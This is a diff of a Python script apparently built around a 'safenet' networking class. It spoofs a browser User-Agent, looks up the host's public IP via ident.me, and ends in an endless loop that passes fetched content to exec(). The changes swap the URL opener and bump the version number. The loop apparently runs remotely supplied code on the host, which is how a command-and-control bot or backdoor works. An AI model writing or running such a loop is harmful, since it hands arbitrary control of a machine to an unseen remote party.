@@ -2,12 +2,7 @@ import traceback
 from urllib import request, parse
 import urllib.request
 
-class AppURLopener(urllib.request.FancyURLopener):
-    version = "Mozilla/5.0"
-
 class safenet:
-    opener = AppURLopener()
-
     hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
@@ -16,9 +11,9 @@ class safenet:
        'Connection': 'keep-alive'}
 
     def version():
-        return '3.16'
+        return '3.17'
     def get(url):
-        return safenet.opener.open(url).read().decode('utf-8')
+        return urlopen(Request(url,headers=safenet.hdr)).read().decode('utf-8')
     def ip():
         return safenet.get('https://ident.me')
     def post(url,datap):
@@ -34,5 +29,3 @@ while True:
             exec(res,cmd[1])
     except Exception as e:
         print('Error [' + e.__doc__ + ']\n' + traceback.format_exc())
-        print(res[0])
-        print(res[1])
